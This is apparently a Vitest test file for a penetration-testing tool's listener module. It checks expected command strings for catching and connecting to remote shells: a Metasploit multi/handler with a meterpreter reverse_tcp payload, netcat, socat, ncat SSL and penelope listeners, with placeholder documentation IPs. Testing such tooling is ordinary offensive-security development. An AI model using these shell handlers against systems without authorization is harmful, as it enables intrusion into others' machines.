import { describe, expect, it } from "vitest";
import { LISTENERS, fillListener } from "../../../engines/payloads/listeners";
import type { ListenerId } from "../../../engines/payloads/types";

const build = (id: ListenerId, values: Record<string, string>) => fillListener(LISTENERS[id].template, values);

const VALUES = {
  LHOST: "192.0.2.10", LPORT: "443", TARGET_IP: "198.51.100.20", BIND_PORT: "4444",
  MSF_PAYLOAD: "windows/x64/meterpreter/reverse_tcp",
};

describe("fillListener", () => {
  const want: Record<ListenerId, string> = {
    penelope: "penelope -O -p 443",
    "rlwrap-nc": "rlwrap nc -lvnp 443",
    "socat-tty": "socat file:`tty`,raw,echo=0 tcp-listen:443",
    "ncat-ssl": "ncat --ssl -lvnp 443",
    "multi-handler": 'msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.0.2.10; set LPORT 443; set ExitOnSession false; run -j"',
    "connect-nc": "rlwrap nc -nv 198.51.100.20 4444",
    "connect-socat": "socat file:`tty`,raw,echo=0 tcp:198.51.100.20:4444",
    "connect-penelope": "penelope -O -c 198.51.100.20 -p 4444",
  };
  it.each(Object.entries(want))("%s", (id, text) => {
    expect(build(id as ListenerId, VALUES)).toBe(text);
  });
  it("covers every listener id", () => {
    expect(Object.keys(LISTENERS).sort()).toEqual(Object.keys(want).sort());
  });
  it("connect listeners are flagged, the rest are not", () => {
    const connect = Object.entries(LISTENERS).filter(([, l]) => l.connect).map(([id]) => id).sort();
    expect(connect).toEqual(["connect-nc", "connect-penelope", "connect-socat"]);
  });
  it("a missing value stays visible as its placeholder", () => {
    expect(build("penelope", {})).toBe("penelope -O -p {LPORT}");
    expect(build("connect-nc", { TARGET_IP: " " , BIND_PORT: "4444" })).toBe("rlwrap nc -nv {TARGET_IP} 4444");
  });
  it("penelope's note names the rlwrap fallback; socat's says reset", () => {
    expect(LISTENERS.penelope.note).toBe("No penelope? rlwrap nc -lvnp {LPORT}");
    expect(LISTENERS["socat-tty"].note).toMatch(/reset/);
  });
});
